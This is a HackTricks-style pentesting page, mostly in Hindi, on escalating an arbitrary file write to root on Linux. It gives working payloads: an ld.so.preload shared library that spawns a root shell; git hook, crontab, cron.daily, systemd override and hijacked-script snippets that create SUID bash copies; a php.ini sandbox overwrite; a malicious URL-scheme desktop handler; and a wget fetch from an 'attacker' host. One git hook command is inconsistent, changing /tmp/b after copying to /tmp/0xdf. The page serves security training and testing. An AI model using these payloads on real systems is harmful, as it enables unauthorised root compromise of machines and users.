# Arbitrary File Write to Root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

यह फ़ाइल **`LD_PRELOAD`** env variable की तरह व्यवहार करती है लेकिन यह **SUID binaries** में भी काम करती है.\
यदि आप इसे बना या संशोधित कर सकते हैं, तो आप प्रत्येक executed binary के साथ लोड होने के लिए एक **path to a library that will be loaded** जोड़ सकते हैं।

उदाहरण के लिए: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) वे **scripts** हैं जो git रिपॉज़िटरी में विभिन्न **events** पर **run** होते हैं, जैसे जब एक commit बनाया जाता है, कोई merge... इसलिए अगर कोई **privileged script or user** ये क्रियाएँ बार-बार कर रहा है और **write in the `.git` folder** संभव है, तो इसे **privesc** के लिए इस्तेमाल किया जा सकता है।

For example, It's possible to **generate a script** in a git repo in **`.git/hooks`** so it's always executed when a new commit is created:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Cron और Time फ़ाइलें

यदि आप **cron-संबंधित फ़ाइलें लिख सकते हैं जिन्हें root execute करता है**, तो आम तौर पर आप अगली बार job चलने पर code execution प्राप्त कर सकते हैं। रोचक लक्ष्य शामिल हैं:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root का अपना crontab `/var/spool/cron/` या `/var/spool/cron/crontabs/` में
- `systemd` timers and the services they trigger

त्वरित जाँच:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
सामान्य दुरुपयोग मार्ग:

- **नया root cron job जोड़ें** `/etc/crontab` या `/etc/cron.d/` की किसी फ़ाइल में
- **पहले से `run-parts` द्वारा चलाए जाने वाले script को बदलें**
- **मौजूद timer target में backdoor डालें** उस द्वारा लॉन्च किए जाने वाले script या binary को संशोधित करके

न्यूनतम cron payload उदाहरण:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
यदि आप केवल किसी cron डायरेक्टरी के अंदर लिख सकते हैं जिसे `run-parts` उपयोग करता है, तो उसकी जगह वहाँ एक executable फ़ाइल डाल दें:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
नोट:

- `run-parts` आम तौर पर डॉट वाले फ़ाइलनामों की उपेक्षा करता है, इसलिए `backup` जैसे नाम पसंद करें, न कि `backup.sh`।
- कुछ distros क्लासिक cron के बजाय `anacron` या `systemd` timers का उपयोग करते हैं, लेकिन दुरुपयोग का विचार वही है: **वह चीज़ बदलें जिसे root बाद में निष्पादित करेगा**।

### Service & Socket फ़ाइलें

अगर आप **`systemd` unit files** या उनके द्वारा संदर्भित फ़ाइलें लिख सकते हैं, तो आप यूनिट को reload और restart करके, या service/socket activation path के trigger होने का इंतज़ार करके root के रूप में code execution हासिल कर सकते हैं।

दिलचस्प लक्ष्य शामिल हैं:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries referenced by `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` paths loaded by a root service

त्वरित जाँच:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Common abuse paths:

- **Overwrite `ExecStart=`** उस root-स्वामित्व वाली service unit में जिसे आप संशोधित कर सकते हैं
- **Add a drop-in override** एक malicious `ExecStart=` के साथ और पहले पुराने को हटा दें
- **Backdoor the script/binary** जो पहले से unit द्वारा संदर्भित है
- **Hijack a socket-activated service** संबंधित `.service` फ़ाइल को संशोधित करके जो socket कनेक्शन मिलने पर शुरू होती है

Example malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
सामान्य सक्रियण प्रवाह:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
If you स्वयं सेवाओं को पुनः आरंभ नहीं कर सकते लेकिन एक socket-activated unit को संपादित कर सकते हैं, तो आपको केवल **क्लाइंट कनेक्शन के लिए प्रतीक्षा** करने की ज़रूरत हो सकती है ताकि backdoored सेवा को root के रूप में निष्पादित किया जा सके।

### Overwrite a restrictive `php.ini` used by a privileged PHP sandbox

कुछ custom daemons उपयोगकर्ता-प्रदान किया गया PHP मान्य करने के लिए `php` को एक **restricted `php.ini`** के साथ चलाते हैं (उदाहरण के लिए, `disable_functions=exec,system,...`)। यदि sandboxed कोड में अभी भी **कोई भी write primitive** मौजूद है (जैसे `file_put_contents`) और आप daemon द्वारा उपयोग किए गए **ठीक वही `php.ini` path** तक पहुँच सकते हैं, तो आप restrictions हटाने के लिए **उस config को overwrite** कर सकते हैं और फिर एक दूसरा payload सबमिट कर सकते हैं जो elevated privileges के साथ चलता है।

Typical flow:

1. First payload overwrites the sandbox config.
2. Second payload executes code now that dangerous functions are re-enabled.

Minimal example (replace the path used by the daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
If the daemon runs as root (or validates with root-owned paths), the second execution yields a root context. This is essentially **privilege escalation via config overwrite** when the sandboxed runtime can still write files.

### binfmt_misc

The file located in `/proc/sys/fs/binfmt_misc` indicates which binary should execute whic type of files. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.

### Overwrite schema handlers (like http: or https:)

जिस attacker के पास victim के configuration directories में write permissions होते हैं, वह आसानी से ऐसी फाइलें बदल या बना सकता है जो सिस्टम के व्यवहार को बदल दें और अनचाही code execution का कारण बनें। `$HOME/.config/mimeapps.list` फाइल को संशोधित करके HTTP और HTTPS URL handlers को एक malicious फाइल की ओर point करने पर (उदा., `x-scheme-handler/http=evil.desktop` सेट करना), attacker यह सुनिश्चित करता है कि **किसी भी http या https लिंक पर क्लिक करने से उस `evil.desktop` फाइल में निर्दिष्ट code ट्रिगर हो जाता है**। उदाहरण के लिए, `$HOME/.local/share/applications` में `evil.desktop` में नीचे दिया गया malicious code रखने के बाद, किसी भी external URL पर क्लिक करने से embedded command चल जाएगा:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
For more info check [**this post**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) जहाँ इसका उपयोग एक वास्तविक vulnerability को exploit करने के लिए किया गया था।

### Root द्वारा चलाए जाने वाले user-writable scripts/binaries

यदि कोई privileged workflow कुछ इस तरह चलता है `/bin/sh /home/username/.../script` (या किसी भी binary जो unprivileged user के स्वामित्व वाली directory के अंदर हो), तो आप इसे hijack कर सकते हैं:

- **Detect the execution:** monitor processes with [pspy](https://github.com/DominicBreuker/pspy) ताकि root द्वारा user-controlled paths को invoke किए जाने को पकड़ा जा सके:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Confirm writeability:** सुनिश्चित करें कि लक्ष्य फ़ाइल और उसकी डायरेक्टरी दोनों आपके उपयोगकर्ता द्वारा मालिकाना/लिखने योग्य हों।
- **Hijack the target:** मूल binary/script का बैकअप लें और एक payload डालें जो SUID shell बनाता है (या कोई अन्य root action), फिर permissions को पुनर्स्थापित करें:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **विशेषाधिकार प्राप्त क्रिया सक्रिय करें** (उदा., एक UI बटन दबाने से सहायक उत्पन्न हो सकता है)। जब root hijacked path को पुनः निष्पादित करे, तो escalated shell को `./rootshell -p` के साथ प्राप्त करें।

## संदर्भ

- [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)

{{#include ../../banners/hacktricks-training.md}}
